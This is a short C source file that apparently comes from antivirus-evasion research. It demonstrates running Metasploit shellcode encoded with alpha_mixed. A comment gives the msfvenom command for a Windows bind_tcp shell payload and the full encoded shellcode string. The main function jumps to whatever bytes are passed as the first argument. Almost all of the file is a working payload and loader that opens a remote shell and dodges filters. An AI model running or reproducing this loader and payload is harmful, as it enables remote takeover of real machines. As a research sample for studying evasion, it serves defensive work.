/*
Filename: alphamixed.c
Author: Daniel Sauder
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
Purpose: Demonstrate a shell binder for msf alpha_mixed encoded shellcode
compile: wine gcc -m32 -ffixed-eax alphamixedcmd.c
*/

#include <stdio.h>

/*
 * msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/alpha_mixed BufferRegister=EAX -f raw
 * now the shellcode can be called as a parameter with:
 * a.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylyxK2S0WpS0QpNiYuDqo054NkBpTpnkqB4LnkcbeDnkCBgXvonWCzuv5akOLlElaqQlDBtlQ0YQzoFmGqyW8b8r0RaGnkF2tPlK2jwLlKPLB1t8zCaXfa8Q0QlKf9Up5QXSNkcyfxysVZQYlKGDLKeQxVVQyonLO18OFmc1zg7H9pSEyf4C1m9h7Kqm5t458dQHNkRxFDVaKcbFNkFl2kNkv85LC18SNkwtnk6azpOyrdutgTCkqKqqF9PZSakOipCoso1JNkgbjKLMsmcX4strC07pCXD7sCVRcoF4bHBld7wVUWkOXUNXz0Vac0wp7YO4CdV0e8TimPrKEPyon5pj4Kv90PYrkMBJwqBJVb3XkZ4OyOYpkOZumGe8GrGpR1ClNiivbJdPQFV7PhiRYK073WYon5OuO03EpXv758LwzIwHyokOIE1G2HqdZL7K8a9o8UQGj7QxSEbNpM0aioHUcZWp0jeTqFf7PhURXYIXaOkOJulCyhEP3NDmlKufpjcp0hc0fp5PS00VsZ30QxQHLdscyuioyEJ3qCpjc0CfbsBwQx5Rn9xHsoYoHUOsihgp3Ngw31zcFIhFBUIyksAA
*/

int main(int argc, char **argv)
{
	register unsigned char* r asm("eax");
	r=argv[1];
	asm("call *%eax;");
}

